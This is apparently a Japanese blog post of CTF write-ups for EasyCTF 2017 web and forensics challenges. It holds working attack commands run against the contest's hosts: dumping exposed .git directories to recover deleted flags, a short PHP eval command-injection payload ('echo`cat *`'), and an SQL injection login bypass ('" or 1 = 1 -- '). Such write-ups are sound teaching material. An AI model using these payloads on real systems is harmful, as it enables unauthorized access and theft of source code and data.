---
layout: post
redirect_from:
  - /writeup/ctf/2017/easyctf-2017-other-problems/
  - /blog/2017/03/22/easyctf-2017-other-problems/
date: "2017-03-22T16:31:19+09:00"
tags: [ "ctf", "writeup", "easyctf" ]
"target_url": [ "https://ctftime.org/event/441" ]
---

# EasyCTF 2017: other problems

A-maze-ingという問題だけは面白かったので別のページに切り出しました。それ以外はそうでもなかったのでまとめた。

## solutions

### Web Tunnel

QR code読み取り自動化chal

QR code (png) を読むとurlが書かれてて、別の同様なQR code画像に繋がる

``` sh
s=DaicO7460493nYSuvLPW ; while [[ "$s" =~ "^[0-9A-Za-z]+$" ]] ; do wget --no-clobber http://tunnel.web.easyctf.com/images/"$s".png ; s="$(zbarimg --raw "$s".png)" ; done ; echo $s
```

`easyctf{y0u_sh0uld_b3_t1r3d_tr4v3ll1ng_all_th1s_w4y!!!!!}`

ファイル多すぎない？？？

``` sh
$ ls
03OcHJ22vE0NsTj0dUgq.png  77YP4bYAIuYbX8lN3wFy.png  CvPzwWX44CzoAsBozAHs.png  HVILmfOfhQONxZyrUz0K.png  mCRe6xbaf0uzl0aUXKZR.png  RkKZcdpjI0nML4rZJvCr.png  w1zdPRn1bcOYdE8ipkmz.png
0GW8daKCRseAtZouyY0Q.png  79J5QShJpXQCPPBzlFeT.png  CwncuJ0I7LFq0JlbDluP.png  HXxsvvtTXM6ei6AA1owM.png  mfvkWJCWTB1xgUIgnrXt.png  roI8xz7svbrGy8Zm3FMI.png  w4uiEZl7NAfuGzjRyWIj.png
0M89gDq06RlEAiyQC51i.png  7cEyTeq9RcLM6awdOEVo.png  cwUyDtt9au4Nm6eXbbEk.png  hY4JNv8ly7iHTOBXFnPz.png  MHv6StrgS5ptP8ZcbJcx.png  Rp4HnXKCBDDFU7paQbMX.png  w5oUznaLCLOoNgrTtSFL.png
0N4UxXvSQIc02pMpb6Ua.png  7G7Uet0DN09GeXd1Htjk.png  CYQMrzR0f7zfekfJpPho.png  HYxixEDkamnwfT7GOaZL.png  MJveDKbGqSWnBeMhyzgm.png  RPl7Eo0VNqIVvl2n94Im.png  wbfGYgyGlNftbhMkAklR.png
0OWIX0VmJSLbHRztJEn4.png  7iisCuZe1hfzkF9ojudi.png  CZwk49wwQDIsL5rzUWUO.png  Hz02Tyiq33nnPJSmDcbh.png  mkUglONCVi9braJplzg6.png  RpOGv5PBawva9sEiHEoi.png  WcctmN8nBkYkR9yNtDRz.png
0tUI3UgEcpduOKFik1Fo.png  7KgamvoOnrya4XGawcb8.png  d6zxEOOtA9xvhj7LZ051.png  HzBbyOPcjwPRnVQqS1Vn.png  mLZAecbxOBlsGB2tt2Mi.png  rQPZ5RbGP6HMfpmpYZ7r.png  wfWMkWs7yuDxHSHTwk9c.png
0xvstUXqThgkUKTWr7vb.png  7SVxhQF50QU8ndE0e8t7.png  DaicO7460493nYSuvLPW.png  I3tnN3iUqCNobYACYG70.png  mnhtcQCX77siwa10uEpa.png  RSAL6SeDvubgBNHZ9WF3.png  wHdZxaVvktOSOka0cwbW.png
1bKioXFNzDnRfpduNqZi.png  7uvgCTvTFfM9G4DtKKcN.png  DBY3OoqXsucmMb6t3mJg.png  I4letZDvCkdfT2qkZWUO.png  mNLrqUxtkLrQVPn8t190.png  rxA0CuLDwvN4ktsSaTrT.png  wjjFapdGib3U4w2SunHe.png
1FJQRoLvoUk6dK8FVNjp.png  7vHtS8FCXWbCLWxLmpTg.png  dIHccMRVtK1aeo3Tu3pf.png  IcheUNZpqGfuzZBuJzKm.png  mPZv0cdL3VUjcSv4PjK7.png  RZQOx6ulMa9M5xmXNGrD.png  WNGiUCafQdsgMfi95zpZ.png
1GK7XZ78XVYeX3tLssaT.png  7zEk6677mkdrbG9a5Cmx.png  dKjVyD4nDDNhOKTUsqu9.png  ICMTuvDgqoKGsf94ikS6.png  MQ34e8uP9Ak4hbwXzInq.png  rZRSZkpAtVYrTue3EMOa.png  wRtxQH4YI72hM01At4Rg.png
1jwLMHNve77Y7jg7FPDf.png  803yXDpkB18551kXlipO.png  dp3YvnbtsZnSrbj0gjpM.png  ICPwQjYMNfBIfXo2EDrk.png  MTrWyWwwYRfzZxcI7Wgn.png  s0Y5xcO73tPOjG1hSEso.png  WTWPaPmpVd9ICHzEfpVw.png
1ujNfgkGWyVFxso6qkdk.png  8azdy7wCJ6GNgUjm3bCb.png  Dr10tlUD2YqvujTLAYBd.png  iFbgdVLIk4OHzWXeRZNu.png  mybhZSAX7weBOX9zIo3b.png  S2qKtjDFcBV7bLvMfZto.png  wUgcljJJbobySs3ZghJN.png
1uM0TtgMjkfK0FiEzoFS.png  8CJRtiDQD52ox2TU8dxj.png  drlINgP6ygynfQ8UuHup.png  iIkwWdRqRCpLPzAc9Sw7.png  N1FDsZrXNGP8VgykkC6i.png  SaMV1cu4sSJmbmtHh74x.png  wUYcf7S3XkltCI6ZyBBA.png
1YdkmIkWurJS7w9jLKHR.png  8n4QsGlDdClEkzoHXs9a.png  DtCHW15tI994qn8dFlt1.png  IitJH9DGV1sdjGBpr06R.png  n2kLPyhpOJlvD16Q71eT.png  sFAUKPxMEnQZMA1rM75M.png  Wv0i6Mc3JZPnpLy20LrI.png
24ePL62Op8Ws4cYIQISq.png  8nbgUJ06fC23vrZRhxf2.png  dz765ZXyVRABu4h5BiYN.png  Im71WM69YTZ0WMH3lyZ8.png  n3S9dPpAbDtwa4hueCkI.png  SHcd0S7LnJyAhdXxOWsZ.png  wvDm23PBInuqoXnuSf4u.png
26SZsmleP2YUthYMjeNs.png  8PsonPDN0WY2Eb53k4r5.png  e1Bl4T59HrpU0agB9ECY.png  IT211UQDvBVyR7erj1Om.png  N6nOmXhgdrx1fkY3MNvp.png  sN2nxjBALsg4gqsXM2Wv.png  wVZdZ38yirov7nmjldEK.png
2AqLsSvyAQznkTtX2xew.png  8qPGy9NBmb2ImgQ2hsib.png  E7TbUvVZjksCrbDuoJea.png  ivkKG2I6s4qwhzKqyOHZ.png  N6tLjyg8qeCjLeVSWNZs.png  SoSlXyLeSXTf4K2wNMem.png  WWgQcv3aWx1hNNhsqgyi.png
2ceCkELMstjS27dMxCSl.png  8VB54me0TA00qm57tISt.png  ebO3ZkR1AUnIOYmPRqF5.png  IZQ9rYSlf3tw0h6AbvAn.png  n7Ka9d5SWD49HfCJ3oB5.png  sPOQ7fCCYOTKADyBXVnH.png  WyjVGV2mLGHztwOGWNgZ.png
2fmYCXhDGKd8A5D3GdtF.png  8XqZVU3J1LaAVzWOnVdD.png  eIiGhAQm6zUnOT21weLz.png  j3BGNsi7mkfuR7D9ragy.png  NBofDP3xpEJpaCQn68Ob.png  SSqNcuPVbuq8KKbI8PTI.png  wzlm5fcNxoTLoBpdWhnq.png
2GD4zwS8RgYm8UD0NGxn.png  9d536g81nAb9s4jWxCKG.png  Ej7OKIWRR3miFWT12tIa.png  j3OC9MAuxLsN1IekpN6Y.png  NCk1xnHJUTJqNDMOO32t.png  SvcRWh3kn3oaEoQ4bXQc.png  x3j2OvTUontnOugU1Ltq.png
2GddkJaYx3Vgaa7TpiN1.png  9fkSyVUSq5do6abGYUUb.png  eko5NetzcuEh83P2eZIf.png  j6GrG2tTQMbCnm2jMIX0.png  nF0GHGGIXkq5liR54Nsd.png  T0c5V3vU5IMpcdW0kc7l.png  x4Gc7lUgvC798wEeSTgh.png
2Kj3l5oXosoKBmEsMmPK.png  9JwQdGnQPtdP9hcVjDLC.png  elnTRSHrBQmmoUpwI7gR.png  j8fwCs0GcItKUjWZbV4r.png  nIBF4rdyQEaDI8CzCrMq.png  T0m70mqwKna03xKbdlLI.png  X5S4F3ISQ1SeUqOXSkUq.png
2PMckmedbpZVGJFcRekU.png  9lY6Bx138HprfzNASGRD.png  elW4VfQ4qYY94SAYXuZM.png  JaDaCaH2IvOTjLUY4cEx.png  nKvyRUSuj2Q4q088sB3x.png  TaQKdHpEJz7XD36O41aC.png  X7MzFYs3QurEf6HBzHIk.png
2q2zsDOQglx68EYmpGr8.png  9nbOnHMaaeiePSdrGCi0.png  er6rm4Av8ITtQ8MyIDeA.png  JDen5jiLwJIaQPAv4liF.png  nKWljlgkSeFvcsiMbYoZ.png  tCMxqnGwM0iaqNOWYwHQ.png  x7VF9QbrpyEGiKFVY5NU.png
39rJnSVQ08Xin9aSrDDR.png  9nTEXevZiJWXe2RcQ0SY.png  EslQfoqafmEQN7lUfC2h.png  Jecf6u4a2luDjxJloiSK.png  nmiAk6y1n2m0GnyKLyDb.png  tDTeALa22qJNn1vIaNcI.png  XcCGC341b6pNwLEdB3sl.png
3bYieVOsvgeZMwS5chyD.png  a0wDHTxSvEYquNbWm8hh.png  evFQIeY37plP2sQXmyB1.png  jglLEv9xKxSfdB72kMRA.png  nN2Pj48FDYE5ndNc3BaX.png  tEFykEP59WqfdhTDucVD.png  xdG49JLPlel3sycEXKq2.png
3CNLZ6ppc482zxobKcwm.png  a2YTBKQTMpDnpvMQxzto.png  EvIhR2bK7iBoSG4ITqPt.png  jhGI88sRtJS2OvZi3yBn.png  nPa3VguU1HHeX2GBrUr0.png  tl2rlgUENhzIYTWD7Sm2.png  xgV274JFwoWkhjQFHTfT.png
3EWkpY0LbHxP3es3ktvu.png  a4Q0dxYn9b1Y4WN3IEiG.png  EVviB5egBCmFd9QQ4DnM.png  jqeIBra2diB5C8xopKFR.png  NtPTpH1n0wEnhJYHbFhn.png  tMBSEGeuj6CjMBenXZlD.png  XNKUGSHnlMp1NMHPz62a.png
3fzoepWRKpxmpA9PxTNQ.png  A7pUSnQsr9QdqLdGb2Zl.png  EwELEaXCYOJ4CukpAucZ.png  JSHdQ9X5sGLUfhw1PhM1.png  NV7MZShpA6dib8ZDTEXg.png  TOowtHt7dD1C8FgcVWMM.png  XnVlui493J1uhAW1bHaC.png
3gCyaMBdnvbnr1APpMFT.png  aaiPTJXCIgbObWSic9wK.png  EwFxp5JKqvN1YQf1hlfd.png  jTf585qjldXddUZOSYNS.png  NxBGIT4egHCoRlyf5ab6.png  TVXox0IwSg5cVnE2qUOd.png  xs54ra8qvFVOXlbACiJC.png
3M4CJU3wWczeI7O2XnLS.png  AEZUtZ6olbaNJOmq2M5T.png  extEZvS0iV0TuOsYF0zm.png  jWVkmvTiS8VGenm4NGre.png  O4eSfFaL6IZhxJjQwa8V.png  tyk1iHx7pV7clj5xk5OH.png  XXGA5VX3nnnJXSVDfriv.png
3VWxeP2ve70b2mqqGXda.png  Agg20qjJJxmjxzZHD90f.png  f5AebauMLyPTWfl4wKjY.png  JwYVBg6LhvRhQYSF3b2p.png  o8F1Xqes74FMlA4gYvm9.png  U1IuznZzxvXBsQ9vF4Rg.png  xyyu2V7iMzLMku1Rqw9O.png
3wLIgzCTKd97PzBkp2Cr.png  ajtsgSudFGJaSQOa4uWT.png  F5UKnXrPm8Jdqe98EbFH.png  k00uFs4pBrItHCgJwepU.png  OjcHgrqwe8EVBtpP7eZp.png  U8RA9ATvOrtTYI2cgdO3.png  y0H7BO27NaRDk3C3FaVk.png
3WnzqpdoqsrsWuNitwNr.png  AKbeB1Ju6hIKk5o9rwdA.png  F7ERs01T6nlUG7HVfUTE.png  k0joEcy0qsmE5APsCQpT.png  oLbVaR8yNkODjjDQG4gP.png  UcAafchXMmhvhWLFsTxf.png  Y1hgP4XXRUvVHVr6VVKD.png
44EUs0pa4EfQm8vvJjo7.png  AMCmM1T8jlclCsAmaYsq.png  f8qJ38jVF0sG8icM63KE.png  k0x3Mi5LWIyNafVFYami.png  onkJ71AOpJ7fEkGadskg.png  ucxLYuKdFWe3LreMrSmS.png  y23KfylNc9uncvr6lQC0.png
4BjKcgpVSDpjtUOPmjSE.png  aQrKmy3abupAVDpOKeU3.png  FBN2VIcMuJvDKoqpa6R1.png  K3MzplxbglNjfKH1AcOs.png  oOzXyWU4fn8YBPvgSNzt.png  UeEcphazhjcJI9ayJER4.png  Y5dN3mrJIXxbxkj9cU8J.png
4cc2sqBbnD5HvSSfuzE3.png  Au27uo4WZDcI2YMkoEqi.png  fDV9UqaR0DdjpyrYvB2C.png  k9Bf9Qdx6ENI9a4V9ktJ.png  Ot89AVAugeMned8fE9cr.png  uH9SbspTlA28fzlPxnon.png  Y7jpCxNvklEZxe3Gh5zt.png
4CYCuswfGnGo1kUqSXKs.png  b4oltMJ7Da136Y2Hmgve.png  fEU0bTpYU37OBYuhoUS5.png  KDKp0XzzBLT3YG53zpGO.png  owcKAa4fCmom6Y3aTs68.png  UJ6GOg5AeihYxWA2VKk7.png  y7LAEbpt0JoGOYUzsZW9.png
4J2byRRCrJvHPZs5PP1Q.png  bcAhjsa1fXnMbYFnTD2W.png  FFQQn4NwMXl6K26Y3uO9.png  KeuSSeWHrQFTCmrEHAYq.png  P75hn0VCl8sU969U80My.png  uLmuRafouSHTbV0ysuTk.png  yb2KzlmgiI3Kzsm5m6Oy.png
4JxggNLjrLV0r04gI50W.png  bEIXVBUDg53RdkPsBivw.png  fh5AMlVhtw7KntgL9Cwh.png  kPmKdSVIbkwkooHUauED.png  pd5lAqT3Z2b7Wt0eN4ge.png  uM11Q5FfbSCWjDDEgKzP.png  yh1cibtZ8wNLKWCU9JUk.png
4Kc1r52G6fYA1TIVa215.png  bfKaQVYva3aA1WuOOJcR.png  FHvcWJmGyEWNmqoxKgbj.png  kpTYHMIy81NaniofCfzT.png  PGbJPFVPk5BZI2CObaoo.png  unCY8SrVh7QoJO1P7fvu.png  yKEuKhfeQCGENaX2LzxU.png
4li9N86JReFKMzd5JRDT.png  BFWwYA8EPr01GLDtDRMg.png  fKxRhI6A8fENsWuPFPd0.png  kq3hOBJQZG8bwV5YeDJF.png  PMPI7a5A4t4IjA3tnrzO.png  unurnKtQ5eDzDSOMZZuN.png  yLq9FlAg3iFPd52xMKEe.png
4p4rAR2MbheFmjd55A65.png  BIX5k2XQOlQQEyagKRZf.png  fpGYb30vi0UC9Si0Vzgr.png  KSz1xktHU8S1YEMbHBEn.png  pmr67PDJ3SqpGIRTyLbK.png  uS4ep4YYZSnlA4crUiAl.png  YMOQaySYivSKJKpemSGl.png
4q1BHp239ZfQfXgEIktP.png  BJdADscDKy4thpWA6vUd.png  FScjBlVapzEwgjZlm2gE.png  KyfVsY20TyGmogyWeVDS.png  PUSmWYfu2TjvVU9Y5zNY.png  uuSr92fFgh7OETCDF86U.png  YnLLwnJP354hf0VcmQ72.png
4QISeETCQ4JhM7RLkSEp.png  BksI3PN1H2eszRWUdtuV.png  fVacku957nZi1btWCjGt.png  l37Uilp8zXATIEiSS5xf.png  pVzNeXkgkoSm5SR7WTYJ.png  UVF2KMNgCksD5YrWDaYt.png  yP1wlbelcjM2bwTmihkx.png
4TOphP1bMxCmydUmYZxZ.png  BKvsggAXtfM7BDv7ns40.png  fw62Yed1wWn65npHr9Cx.png  L3fNcZyFovOem8YPCSAL.png  pwuCNoIXd45FPnkBkFuT.png  UVjup5fPDIFWJ9kMVkSb.png  YQFypP1PJgGqq4AG1MgD.png
4VvQnndiyVsufqJJGNnp.png  bl9BimiQOpw99yAYFbbD.png  FXpi4ahSC1xXOVzs0aLT.png  l3YOGvMyVZrthJGO9wPc.png  PxrlbJOBlz9ngAdSkJmN.png  UvsOYxGwGjLWZw9yAiUy.png  yQGmPXnB1SRQhN9s4rLW.png
54gxSl42z52PxncQiWTd.png  bLYNp13mYjNx745jMS7N.png  FYUMfAf4iaHhVaq3BdDt.png  L4Vm0z9dythaLRndXdUU.png  PXTj4HB5jFPvKVO7l0yO.png  uWaWBJT9TXYCqhrfX2oT.png  YR5QIdRM06Mwk6jDeNlh.png
55DVktK57ku06YGmbg6j.png  buQ606MpriqmirQAPR1T.png  g1gogZtx25JRdziC5ban.png  l6lIQTP85YwTQABETAqB.png  pyQasbpYyWV6ptGZTn4x.png  ux2XDQYAIYKgVMiegGrj.png  ytToQkvktbt4bvpjBQy8.png
55W5RnUDC9hg3T0VwDz9.png  BVEcdvZ5tumnM732jnZz.png  g379RXpwEz6n0dgzoHCK.png  l6OQgr34Os0nriHn9iRG.png  Q1vBPKMS4yfvpEUYtvfa.png  uySqHFkFFp6yP1S82glL.png  yUN4AfBDuXnWIyqXkzPc.png
5dHR7jWz2DFPRGIgR2cN.png  bZkesjKQcvHfyRSpc2nF.png  g6FAoH56T1zcrQyHrLkk.png  l9zufg9c8R05swPFOFDl.png  Qc6ukswwuWrx7yu83HQc.png  uz7JsHvRXa8f2flhW9xG.png  Z2OGkP7ALt5GU786p9rg.png
5g9yjy1OW0hzzWImfWwd.png  c0crfYLbJUd2mi3TnI8m.png  GByiEjV4uiH4n0sZmw9a.png  LAgsO0AZVKfFnc8sItWA.png  qDEnPZiXm2UYRFGVmFC8.png  v0fhgIKsKUKpPdiqACZz.png  Z7t7Pc3UUHeTI3muIp6H.png
5i3dS13cqXiPY4JRVDq6.png  C5zAe1OafRiAeMHyVkBK.png  gdxgHqNA9EKsuNVE3ieF.png  lbaY9ruXz3IZ7CSA1WBB.png  qEDQrYCQcnTCNJE7eDu3.png  v55A0ioD33XNYAl4lfTb.png  z7TkS9jAFF1ZQRhfyPFY.png
5iuLB5tHKGQLdqSQSFt3.png  c6fDE99MtUa3TOoH5vZA.png  gEbOoHZw8G4l6HYDfe3B.png  Ld2cUpzyNUhsaHEgYlCK.png  QF7iI9kuqCC7jYcrRMSV.png  v5kVh6t7uca6hX11sOXU.png  Z83XRAQmJveQwqpobknQ.png
5kche83imCmyzrIAmUhG.png  C704oTItNhk8kr9qgZYW.png  gj03Ks6d7htd8ubeZxir.png  ldcGF62EnBNnEAco9pCn.png  QJYDpHXasvuG5fy2TCMf.png  v7SQm9i5NdzLnmeWrsWR.png  ZbgkD4ReSvnVx5YvtRtg.png
5VREy6lF6budZRo50tgR.png  cadc1OkSA4oFNWTGt674.png  GllSYPLWfrmPknX9SJWk.png  lf7udExZe5cVkNzVZgjB.png  QkzvsYfg9xdG1WP1edww.png  v8a3McWWd4Z0bs3nx63L.png  zces2DjRMYzhY4agaI2K.png
5WDP8nyV4lMwDora1zh5.png  cbCp1FfW7G0XA9wXxtWR.png  gLyg09LRoLImBcsS16Fb.png  LfR8hACsKogzroseyZuD.png  QL6Pen5knww8l8SHS3e1.png  VAAOArdmwiNx7mVoMuj3.png  ZDFaHmF8FQfBxg5PWsZP.png
5WrAPqkRIqrYKmCJuGsv.png  cBolTRRbeqFZ9dDfSQw7.png  GMRqX1aIUdRatg4m8UNJ.png  LfxorwTKiL32vtTfBjU0.png  qmQNfVv1f3jKOxWPgCjs.png  VBkV6ucJr3akLlXOM4EV.png  Ze3FYfd7ukInlADsfO9b.png
664fac768ipfdjg2FTCL.png  cCBTgjVeQ2yHHh2dZBJw.png  GoyiTuXOaqAhEv2G2YzC.png  LIDLkJ6jX0uBs4yyoEbl.png  QpmPpfPO2lkIZCcfleKr.png  vchyTWkwDCfeoVvt4HNp.png  zEnc6SciU2Fq4UnkkZnx.png
6AmyNLUSMKkGgqV38waT.png  cDhWk8dkX2A8XH62S3K0.png  h0eG1HGJJlXFBlW5LvyC.png  LINWKK6pMh2YfG7Z5hkX.png  qpOHkHC4gnwHVOL8J48F.png  Vd6N2thTdlXBRI2R4Vr1.png  ZGNt88DkQ9AJthhu23f7.png
6aZA1hJbTaqwyluH9eOH.png  cfcRQMdVKrstCcO3fDwX.png  H0hKXPNcFXOTJ30edrod.png  lJ8hc6AMOdkHXNy6ytUE.png  QTXZuwSkpjmMX61xkDvn.png  veLqVd3uNqhyYToH1Dfj.png  ZHr113brL6pZ5thqxJra.png
6DGiJ0S8dnfqxrVKCvtd.png  Cfmcty2QLlV8QDzd7BJa.png  h3d0mOApnx3XoL9foSD7.png  lkRXwkCtFf4Y1aoEcEsD.png  qUyXgJUqfpG3kR3HLYyt.png  VFPYjgfFdbRtlEFHncpU.png  znTjhBPLL6VcrsFmWKXD.png
6Fgk5QZmazcxNjlVTkun.png  CJDCdtdhUWl7lIbwWZod.png  H9hz80Y4x45lZMjzFdvd.png  LLCuoWjeloRMKwtBOOl0.png  qyft55SYZ212pRqvhEjp.png  VgpDcezwpd6JNyCXg5yY.png  zOlj9jFs3d3OVAzT4s5V.png
6hFeBbeH6YFRKhA1lodM.png  cjGh7tXAGWcq3WF5PFeK.png  Hbnp0n9n6J5IDqivLZZv.png  LlkOe9wEvnkUDttZuqe9.png  r04hovh7JpDIv5xs7dFx.png  VGS0vNHK6RohTRzWBwFe.png  ZpBSnf6EhIhrVKLx8YXD.png
6j0hSmtsNLvDnTcu6ifR.png  cmH4VDzUWgMjwvjvbFvp.png  hCfFVXLUkU7gv7dtIhnL.png  lmfuxyxlkZ66kezDYupx.png  r4GIAU28Pu2wZIoq7fAN.png  VJn6v0MJl8MfpVwt8Jgz.png  ZPYiMZnxfxHUlYrnp1Eo.png
6JLps3OwqMGFAZNzf5IS.png  CmiicGpMvQAjnbTTIzEF.png  HCLBPISNQpgAVriGoIze.png  Lqh9zNbaZrC9VEPUJbXM.png  r6C5y7h2NaXb1tQ4lB1A.png  Vk55zHq7gyRFKYKrvsdP.png  zr7HGz8I77VT33hign9I.png
6qD606qXcQDnIWEnNUZG.png  cofuqKgYtHR37YZaBbdC.png  hfFT9oI0o4glG1EafP2f.png  LuhbSOftwtmYnasonIXJ.png  rDCPACgyfswqL5h0qh0T.png  vlv6jI5NZPKnHTgdLpAC.png  zuMgTgUeZnYUhl8jnW7R.png
6tKgVP2GEwxRCm96wAay.png  Cq3rfde3SqMOTER5seY9.png  hMX7GoKM4zaS95x4jwoo.png  LVHjYIcQTNYD7l2ncJcQ.png  re6oYoQkK11G3cd7bJmy.png  Vnc5a2gqmpD2uG4c0VEE.png  ZWddwftEDtfimNtuZfCN.png
6ueuThgbsu52nhMyfyqj.png  Cqkohd5z1O5G6Q5rmgtj.png  hNeCKbUoZT2g77wIVsYj.png  lVximFIIxyoEXFDKNjrt.png  rgFlvg90oK26H70fTFlt.png  VpMvcUNECEfrWRUpORxz.png
6y3ElDsNQ9CWc1TiflEI.png  CtBOXCx7OXLk7R4zaKtG.png  HSNc8lj1MvfELWceufeC.png  LWN1po6oiDKyqBTRftI4.png  ri7WeSw9u8W1RVuKEU3u.png  vUSe46H9rsS2zBA059Eg.png
6yOmm62HKQvFrNG9e3h5.png  CTK03A9OCB5nSJolLBGu.png  Ht6uUtZ6gUx9yxB2HlpU.png  m1vcAJPE8mxzIMaCcZJ6.png  rIOJUcLbZEiy1lSmRCou.png  vuVLzCVE2rBaxtsyrVAe.png
76cseHRCZ7C5DEBB0ryq.png  cuZPnmaj91ifcaI9lkje.png  HuBaJcTAT53nFQzMZrHw.png  MBzKunCQk7t5eVDwxsZr.png  rjwHdO3aZc8T7GAKLbNf.png  W1rQ3yvQ2TZ2M6NxMJe3.png
```

### Edge 1

``` sh
$ wget -r --reject-regex '\?' http://edge1.web.easyctf.com/.git/
$ cd edge1.web.easyctf.com
$ git log
commit ee9061b25d8a35bae8380339f187b44dc26f4999
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:11:47 2017 +0000

    Whoops! Remove flag.

commit afdf86202dc8a3c3d671f2106d5cffa593f2b320
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:11:45 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando <fermayo@gmail.com>
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version

commit 8ac4f76df2ce8db696d75f5f146f4047a315af22
Author: Fernando Mayo <fermayo@gmail.com>
Date:   Sat Dec 14 07:36:18 2013 -0800

    Initial commit

$ git diff afdf86202dc8a3c3d671f2106d5cffa593f2b320 | grep easyctf
-easyctf{w3_ev3n_u53_git}
```


### Edge 2

```
$ git clone https://github.com/internetwache/GitTools
$ ./GitTools/Dumper/gitdumper.sh http://edge2.web.easyctf.com/.git/ edge2.web.easyctf.com
Destination folder does not exist
Creating edge2.web.easyctf.com/.git/
Downloaded: HEAD
Downloaded: objects/info/packs
Downloaded: description
Downloaded: config
Downloaded: COMMIT_EDITMSG
Downloaded: index
Downloaded: packed-refs
Downloaded: refs/heads/master
Downloaded: refs/remotes/origin/HEAD
Downloaded: refs/stash
Downloaded: logs/HEAD
Downloaded: logs/refs/heads/master
Downloaded: logs/refs/remotes/origin/HEAD
Downloaded: info/refs
Downloaded: info/exclude
Downloaded: objects/15/ca375e54f056a576905b41a417b413c57df6eb
Downloaded: objects/a4/8ee6d6ca840b9130fbaa73bbf55e9e730e4cfd
Downloaded: objects/00/00000000000000000000000000000000000000
Downloaded: objects/26/e35470d38c4d6815bc4426a862d5399f04865c
Downloaded: objects/6b/4131bb3b84e9446218359414d636bda782d097
Downloaded: objects/7b/456b0125e74b44d1147182019c704c53132013
Downloaded: objects/8a/c4f76df2ce8db696d75f5f146f4047a315af22
Downloaded: objects/ef/6648fbe67b66177281ae47390dc85ee101c18b
Downloaded: objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
Downloaded: objects/71/8a78c464ed47bf916ac8287612b8ad941f433d
Downloaded: objects/37/ec93a14fdcd0d6e525d97c0cfa6b314eaa98d8
Downloaded: objects/7c/27b010ab7a003468fa52dc311958aa90ee93fd
Downloaded: objects/6a/27de374c0e214d1296e7efcb9248afbda4144f
Downloaded: objects/3e/80375f25952db9f5d0ec91eff61f0dcdb73881
Downloaded: objects/96/8c8df7909f842e19469796df59fe6c5ba62740
Downloaded: objects/bf/b7f616dccce6861eee15c98bb2239bd23916a6
Downloaded: objects/ee/e07900b99065703cdb4e9b6690e7ea80f459c9
Downloaded: objects/bd/083286051cd869ee6485a3046b9935fbd127c0
Downloaded: objects/14/032aabd85b43a058cfc7025dd4fa9dd325ea97
Downloaded: objects/a7/f8a24096d81887483b5f0fa21251a7eefd0db1
Downloaded: objects/5d/f8b56e2ffd07b050d6b6913c72aec44c8f39d8
Downloaded: objects/cb/6139863967a752f3402b3975e97a84d152fd8f
Downloaded: objects/e0/6d2081865a766a8668acc12878f98b27fc9ea0
Downloaded: objects/09/432cab87abee259ce62242ba90217c4e7f8b58
Downloaded: objects/61/67622cecfb5c0f04156363565e3d4109fc55c5
Downloaded: objects/ed/3905e0e0c91d4ed7d8aa14412dffeb038745ff
Downloaded: objects/b9/3a4953fff68df523aa7656497ee339d6026d64
Downloaded: objects/94/fb5490a2ed10b2c69a4a567a4fd2e4f706d841
Downloaded: objects/14/13fc609ab6f21774de0cb7e01360095584f65b
Downloaded: objects/9e/612858f802245ddcbf59788a0db942224bab35
Downloaded: objects/64/539b54c3751a6d9adb44c8e3a45ba5a73b77f0
Downloaded: objects/8a/2e99a535d47e5798b167d1074ae2c77cab21e7
Downloaded: objects/9b/cd2fccaed9442f1460191d6670ca5e8e08520c
Downloaded: objects/d1/608e37ffa979b8689bfb868ad8b061b191f6f6
$ cd edge2.web.easyctf.com
$ git log
commit a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:32:12 2017 +0000

    Prevent directory listing.

commit 6b4131bb3b84e9446218359414d636bda782d097
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:32:10 2017 +0000

    Whoops! Remove flag.

commit 26e35470d38c4d6815bc4426a862d5399f04865c
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:32:09 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando <fermayo@gmail.com>
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version

commit 8ac4f76df2ce8db696d75f5f146f4047a315af22
Author: Fernando Mayo <fermayo@gmail.com>
Date:   Sat Dec 14 07:36:18 2013 -0800

    Initial commit
$ git diff 26e35470d38c4d6815bc4426a862d5399f04865c | grep easyctf
-easyctf{hiding_the_problem_doesn't_mean_it's_gone!}
```

### Cookie Blog

問題名からしてCookieなので

``` sh
$ curl -s -D- http://cookieblog.web.easyctf.com/ | grep Set-Cookie:
Set-Cookie: __cfduid=d7cd0f27a2315c12311e7a565f8b98fcb1489559702; expires=Thu, 15-Mar-18 06:35:02 GMT; path=/; domain=.easyctf.com; HttpOnly
Set-Cookie: flag=easyctf%7Byum_c00kies%21%21%21%7D
$ echo 'easyctf%7Byum_c00kies%21%21%21%7D' | urlencode -d
easyctf{yum_c00kies!!!}
```

### TinyEval

phpとしてevalされる
文字数制限あるのでいい感じにする

```
$ curl http://tinyeval.web.easyctf.com/ -F cmd='echo`cat *`'
<p>Give me something to eval!</p>

FROM tutum/lamp:latest
EXPOSE 80
RUN sed -i 's/AllowOverride FileInfo/AllowOverride All/' /etc/apache2/sites-enabled/000-default.conf
RUN a2enmod rewrite
RUN rm -rf /app/*
COPY . /app/
RUN echo "Options -Indexes\n" > .htaccess
CMD '/run.sh'easyctf{it's_2017_anD_we're_still_using_PHP???}
<p>Give me something to eval!</p>

<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (strlen($cmd) > 11) {
        echo "sorry, your string is too long :(";
    } else {
        echo eval($cmd . ";");
    }
}
?>

<form method=post>
<input type=text name=cmd>
<input type=submit>
</form>
<form method=post>
<input type=text name=cmd>
<input type=submit>
</form>
```

### SQL Injection 1

`' or 1 = 1 -- `でなくて`" or 1 = 1 -- `でないとだめ

``` sh
$ curl http://injection1.web.easyctf.com/ -F username=admin -F password='" or 1 = 1 -- '
<html>

<head>
    <title>Injection 1</title>
</head>

<body>
    <h1>Login</h1>
    
    
        <p>Thanks for logging in. Your flag is <code>easyctf{a_prepared_statement_a_day_keeps_the_d0ctor_away!}</code></p>
    
</body>

</html>
```

### Zooooooom

```
$ exiftool -b -ThumbnailImage d9040024afd9d38b73c72e30f722cf09e1093e3c_hekkerman.jpg > thumb.jpg
$ exiftool -b -ThumbnailImage thumb.jpg > thumb.1.jpg
```

